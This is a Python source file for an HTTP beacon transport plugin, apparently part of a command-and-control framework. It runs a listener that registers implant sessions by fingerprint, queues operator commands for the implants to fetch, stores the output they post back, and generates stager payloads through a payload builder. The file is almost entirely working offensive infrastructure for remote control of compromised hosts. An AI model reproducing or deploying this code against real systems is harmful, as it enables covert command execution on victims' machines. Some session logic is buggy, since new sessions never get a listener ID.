#!/usr/bin/env python3
"""
HTTP Beacon Transport Plugin
"""

import json
import threading
import time
import uuid
from typing import List, Dict
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from ..listener_manager import TransportPlugin, ListenerConfig, Session

class BeaconHandler(BaseHTTPRequestHandler):
    def __init__(self, plugin_instance, *args, **kwargs):
        self.plugin = plugin_instance
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        if self.path == '/beacon':
            self._handle_beacon()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/beacon/result':
            self._handle_result()
        else:
            self.send_response(404)
            self.end_headers()
    
    def _handle_beacon(self):
        fingerprint = self.headers.get('X-Fingerprint', '')
        client_ip = self.client_address[0]
        
        # Register or update session
        session_id = self.plugin._get_or_create_session(fingerprint, client_ip)
        
        # Get command for this session (simple queue)
        command = self.plugin._get_command(session_id)
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(command.encode())
    
    def _handle_result(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        
        # Parse result data
        try:
            data = dict(x.split('=') for x in post_data.split('&'))
            fingerprint = data.get('fingerprint', '')
            output = data.get('output', '')
            
            # Store result
            self.plugin._store_result(fingerprint, output)
            
            self.send_response(200)
            self.end_headers()
        except Exception as e:
            self.send_response(400)
            self.end_headers()

class HTTPBeaconPlugin(TransportPlugin):
    def __init__(self):
        self.listeners = {}
        self.sessions = {}
        self.command_queue = {}
        self.results = {}
    
    def start_listener(self, config: ListenerConfig) -> str:
        """Start HTTP beacon listener"""
        listener_id = str(uuid.uuid4())
        
        try:
            # Create handler with plugin reference
            def handler_factory(*args, **kwargs):
                return BeaconHandler(self, *args, **kwargs)
            
            server = HTTPServer((config.host, config.port), handler_factory)
            
            self.listeners[listener_id] = {
                'server': server,
                'config': config,
                'thread': None,
                'running': True
            }
            
            # Start server thread
            server_thread = threading.Thread(
                target=self._run_server,
                args=(listener_id,),
                daemon=True
            )
            server_thread.start()
            self.listeners[listener_id]['thread'] = server_thread
            
            return listener_id
            
        except Exception as e:
            raise Exception(f"Failed to start HTTP listener: {e}")
    
    def stop_listener(self, listener_id: str) -> bool:
        """Stop HTTP listener"""
        if listener_id not in self.listeners:
            return False
        
        try:
            listener = self.listeners[listener_id]
            listener['running'] = False
            listener['server'].shutdown()
            
            # Clean up sessions
            sessions_to_remove = [
                sid for sid, session in self.sessions.items()
                if session['listener_id'] == listener_id
            ]
            
            for session_id in sessions_to_remove:
                del self.sessions[session_id]
            
            del self.listeners[listener_id]
            return True
            
        except Exception:
            return False
    
    def generate_payload(self, config: ListenerConfig) -> str:
        """Generate HTTP beacon payload"""
        from ...tools.payload_builder import PayloadBuilder
        
        builder = PayloadBuilder()
        options = {
            'host': config.host,
            'port': config.port,
            'engagement_id': config.engagement_id,
            'interval': config.options.get('interval', 30)
        }
        
        return builder.build_stager('http', options)
    
    def list_sessions(self, listener_id: str) -> List[Session]:
        """List active sessions for listener"""
        sessions = []
        for session_id, session_data in self.sessions.items():
            if session_data['listener_id'] == listener_id:
                sessions.append(Session(
                    session_id=session_id,
                    listener_id=listener_id,
                    remote_ip=session_data['remote_ip'],
                    fingerprint=session_data['fingerprint'],
                    first_seen=session_data['first_seen'],
                    last_seen=session_data['last_seen'],
                    metadata=session_data['metadata'],
                    status=session_data['status']
                ))
        return sessions
    
    def send_command(self, session_id: str, command: str):
        """Queue command for session"""
        if session_id not in self.command_queue:
            self.command_queue[session_id] = []
        self.command_queue[session_id].append(command)
    
    def get_results(self, session_id: str) -> List[str]:
        """Get results for session"""
        return self.results.get(session_id, [])
    
    def _run_server(self, listener_id: str):
        """Run HTTP server"""
        listener = self.listeners[listener_id]
        server = listener['server']
        
        try:
            while listener['running']:
                server.handle_request()
        except Exception as e:
            if listener['running']:
                print(f"Server error: {e}")
    
    def _get_or_create_session(self, fingerprint: str, client_ip: str) -> str:
        """Get existing session or create new one"""
        # Find existing session by fingerprint
        for session_id, session_data in self.sessions.items():
            if session_data['fingerprint'] == fingerprint:
                # Update last seen
                session_data['last_seen'] = datetime.now().isoformat()
                return session_id
        
        # Create new session
        session_id = str(uuid.uuid4())
        self.sessions[session_id] = {
            'listener_id': None,  # Will be set by caller
            'remote_ip': client_ip,
            'fingerprint': fingerprint,
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'metadata': {'transport': 'http'},
            'status': 'active'
        }
        
        return session_id
    
    def _get_command(self, session_id: str) -> str:
        """Get next command for session"""
        if session_id in self.command_queue and self.command_queue[session_id]:
            return self.command_queue[session_id].pop(0)
        return 'noop'
    
    def _store_result(self, fingerprint: str, output: str):
        """Store command result"""
        # Find session by fingerprint
        for session_id, session_data in self.sessions.items():
            if session_data['fingerprint'] == fingerprint:
                if session_id not in self.results:
                    self.results[session_id] = []
                self.results[session_id].append({
                    'timestamp': datetime.now().isoformat(),
                    'output': output
                })
                break